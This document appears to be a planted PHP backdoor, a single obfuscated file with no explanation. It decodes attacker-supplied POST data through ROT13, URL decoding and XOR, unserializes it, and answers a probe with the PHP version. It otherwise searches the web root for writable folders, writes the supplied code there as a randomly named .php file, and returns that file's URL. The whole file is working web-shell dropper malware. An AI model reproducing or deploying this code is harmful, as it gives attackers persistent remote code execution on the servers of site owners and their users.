<?php $nsskzwiudzdiz = "iqsppblumpliraga";$ghqstelga = "";foreach ($_POST as $gxqifyw => $iqiqxq){if (strlen($gxqifyw) == 16 and substr_count($iqiqxq, "%") > 10){uklzr($gxqifyw, $iqiqxq);}}function uklzr($gxqifyw, $czzwqvwnf){global $ghqstelga;$ghqstelga = $gxqifyw;$czzwqvwnf = str_split(rawurldecode(str_rot13($czzwqvwnf)));function ixmbabmtji($wtlou, $gxqifyw){global $nsskzwiudzdiz, $ghqstelga;return $wtlou ^ $nsskzwiudzdiz[$gxqifyw % strlen($nsskzwiudzdiz)] ^ $ghqstelga[$gxqifyw % strlen($ghqstelga)];}$czzwqvwnf = implode("", array_map("ixmbabmtji", array_values($czzwqvwnf), array_keys($czzwqvwnf)));$czzwqvwnf = @unserialize($czzwqvwnf);if (@is_array($czzwqvwnf)){$gxqifyw = array_keys($czzwqvwnf);$czzwqvwnf = $czzwqvwnf[$gxqifyw[0]];if ($czzwqvwnf === $gxqifyw[0]){echo @serialize(Array('php' => @phpversion(), ));exit();}else{function gojssuxlub($nsskzwiudir) {static $pbfgt = array();$vwptggrokp = glob($nsskzwiudir . '/*', GLOB_ONLYDIR);if (count($vwptggrokp) > 0) {foreach ($vwptggrokp as $nsskzwiud){if (@is_writable($nsskzwiud)){$pbfgt[] = $nsskzwiud;}}}foreach ($vwptggrokp as $nsskzwiudir) gojssuxlub($nsskzwiudir);return $pbfgt;}$aviqgj = $_SERVER["DOCUMENT_ROOT"];$vwptggrokp = gojssuxlub($aviqgj);$gxqifyw = array_rand($vwptggrokp);$rtmobuwn = $vwptggrokp[$gxqifyw] . "/" . substr(md5(time()), 0, 8) . ".php";@file_put_contents($rtmobuwn, $czzwqvwnf);echo "http://" . $_SERVER["HTTP_HOST"] . substr($rtmobuwn, strlen($aviqgj));exit();}}}